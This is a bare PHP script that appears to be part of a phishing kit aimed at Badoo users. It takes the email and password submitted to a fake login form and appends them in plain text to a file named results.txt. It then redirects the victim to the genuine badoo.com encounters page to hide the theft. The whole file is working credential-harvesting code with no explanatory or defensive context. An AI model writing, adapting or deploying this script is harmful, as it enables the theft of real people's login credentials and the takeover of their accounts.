<?php
if (isset($_POST['email']) && $_POST['email'] != "" && isset($_POST['password']) && $_POST['password'] != "") {
  $email = $_POST['email'];
  $password = $_POST['password'];

  $result = "Email -> " . $email."\nPassword -> " . $password . "\n-----------------------\n";
  $myfile = fopen("results.txt", "a");
  fwrite($myfile, $result);
  fclose($myfile);
  header("Location: https://badoo.com/encounters");
}

?>
